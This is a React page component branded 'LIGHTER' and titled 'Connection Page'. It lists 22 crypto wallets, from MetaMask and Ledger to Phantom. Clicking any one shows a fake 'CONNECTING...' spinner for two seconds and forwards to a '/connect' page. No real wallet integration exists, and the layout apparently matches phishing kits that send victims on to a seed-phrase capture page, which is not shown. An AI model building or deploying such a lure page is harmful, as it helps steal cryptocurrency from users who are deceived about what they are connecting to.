import { useState } from 'react';
import { Link, useNavigate } from 'react-router-dom';
import { motion } from 'framer-motion';
import { Menu, X, Loader2 } from 'lucide-react';
import lighterLogo from '@/assets/lighter-logo.png';

const wallets = [
    { name: 'MetaMask', icon: '🦊' },
    { name: 'Ledger', icon: '🔐' },
    { name: 'Trezor', icon: '🛡️' },
    { name: 'Trust Wallet', icon: '💎' },
    { name: 'WalletConnect', icon: '🔗' },
    { name: 'Stacks', icon: '⚡' },
    { name: 'Safepal', icon: '🔒' },
    { name: 'Exodus', icon: '🚀' },
    { name: 'Atomic', icon: '⚛️' },
    { name: 'Gem Wallet', icon: '💠' },
    { name: 'Phantom', icon: '👻' },
    { name: 'Wasabi', icon: '🟢' },
    { name: 'Binance', icon: '🟡' },
    { name: 'Arbitrum', icon: '🔵' },
    { name: 'Zerion', icon: '🟣' },
    { name: 'Xverse', icon: '✖️' },
    { name: 'Solflare', icon: '🔥' },
    { name: 'Leap', icon: '🐸' },
    { name: 'Keplr', icon: '🪐' },
    { name: 'Rainbow', icon: '🌈' },
    { name: 'Jup Wallet', icon: '🪙' },
    { name: 'Backpack', icon: '🎒' },
  ];
  

const Validate = () => {
  const [isMenuOpen, setIsMenuOpen] = useState(false);
  const [loadingWallet, setLoadingWallet] = useState<string | null>(null);
  const navigate = useNavigate();

  const navLinks = [
    { label: 'RESOURCES', href: '/#resources' },
    { label: 'FAQ', href: '/#faq' },
    { label: 'COMMUNITY', href: '/#community' },
  ];

  const handleWalletClick = (walletName: string) => {
    setLoadingWallet(walletName);
    setTimeout(() => {
      navigate(`/connect?wallet=${encodeURIComponent(walletName)}`);
    }, 2000);
  };

  return (
    <div className="min-h-screen bg-background">
      <header className="fixed top-0 left-0 right-0 z-50 bg-background/80 backdrop-blur-md border-b border-border/30">
        <div className="container mx-auto px-6 py-4">
          <nav className="flex items-center justify-between">
            <Link to="/" className="flex items-center gap-2 text-foreground hover:text-primary transition-colors">
              <img src={lighterLogo} alt="Lighter" className="w-6 h-6 object-contain" />
              <span className="font-sans font-bold text-lg tracking-wider">LIGHTER</span>
            </Link>
            <div className="hidden md:flex items-center gap-12">
              {navLinks.map((link) => (
                <Link key={link.label} to={link.href} className="text-sm font-mono text-muted-foreground hover:text-foreground transition-colors tracking-widest">
                  {link.label}
                </Link>
              ))}
            </div>
            <div className="hidden md:flex items-center gap-4">
              <Link to="/" className="btn-nav btn-corners text-xs">
                <span className="corner corner-tl" />
                <span className="corner corner-tr" />
                <span className="corner corner-bl" />
                <span className="corner corner-br" />
                HOME
              </Link>
            </div>
            <button className="md:hidden text-foreground" onClick={() => setIsMenuOpen(!isMenuOpen)}>
              {isMenuOpen ? <X className="w-6 h-6" /> : <Menu className="w-6 h-6" />}
            </button>
          </nav>
          {isMenuOpen && (
            <div className="md:hidden pt-4 pb-6 border-t border-border/30 mt-4">
              <div className="flex flex-col gap-4">
                {navLinks.map((link) => (
                  <Link key={link.label} to={link.href} className="text-sm font-mono text-muted-foreground hover:text-foreground transition-colors tracking-widest" onClick={() => setIsMenuOpen(false)}>
                    {link.label}
                  </Link>
                ))}
                <Link to="/" className="btn-nav btn-corners text-xs mt-4">
                  <span className="corner corner-tl" />
                  <span className="corner corner-tr" />
                  <span className="corner corner-bl" />
                  <span className="corner corner-br" />
                  HOME
                </Link>
              </div>
            </div>
          )}
        </div>
      </header>
      <main className="pt-32 pb-16 px-6">
        <div className="container mx-auto max-w-4xl">
          <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ duration: 0.6 }} className="text-center mb-12">
            <h1 className="text-3xl md:text-4xl font-bold text-primary tracking-wider mb-4">Connection Page</h1>
            <p className="text-sm text-muted-foreground tracking-wide">Connect with one of our available providers or create a new one.</p>
          </motion.div>
          <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ duration: 0.6, delay: 0.2 }} className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {wallets.map((wallet, index) => (
              <motion.button
                key={wallet.name}
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ duration: 0.4, delay: 0.1 * index }}
                onClick={() => handleWalletClick(wallet.name)}
                disabled={loadingWallet !== null}
                className={`card-terminal p-6 flex flex-col items-center gap-3 hover:border-primary/50 transition-all duration-300 group relative ${loadingWallet === wallet.name ? 'border-primary/50' : ''} ${loadingWallet !== null && loadingWallet !== wallet.name ? 'opacity-50' : ''}`}
              >
                {loadingWallet === wallet.name && (
                  <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="absolute inset-0 bg-background/80 backdrop-blur-sm flex items-center justify-center rounded-lg">
                    <div className="flex items-center gap-3">
                      <Loader2 className="w-5 h-5 text-primary animate-spin" />
                      <span className="text-xs text-primary tracking-widest">CONNECTING...</span>
                    </div>
                  </motion.div>
                )}
                <span className="text-3xl group-hover:scale-110 transition-transform">{wallet.icon}</span>
                <span className="text-sm text-primary tracking-widest">{wallet.name}</span>
              </motion.button>
            ))}
          </motion.div>
        </div>
      </main>
      <footer className="py-8 border-t border-border/30">
        <div className="container mx-auto px-6 text-center">
          <p className="text-xs text-muted-foreground tracking-widest">© 2025 LIGHTER. ALL RIGHTS RESERVED.</p>
        </div>
      </footer>
    </div>
  );
};

export default Validate;
